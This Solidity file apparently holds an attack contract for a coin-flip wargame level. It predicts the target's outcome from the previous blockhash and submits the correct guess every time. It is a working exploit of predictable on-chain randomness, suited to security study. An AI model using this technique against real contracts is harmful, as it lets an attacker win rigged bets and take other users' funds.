// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./ICoinFlip.sol";

contract Attacker {
    using SafeMath for uint256;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip coinFlip;

    constructor(ICoinFlip _coinFlip) {
        coinFlip = _coinFlip;
    }

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 flip = blockValue.div(FACTOR);
        bool side = flip == 1 ? true : false;
        if (side == true) {
            ICoinFlip(coinFlip).flip(true);
        } else {
            ICoinFlip(coinFlip).flip(false);
        }
    }
}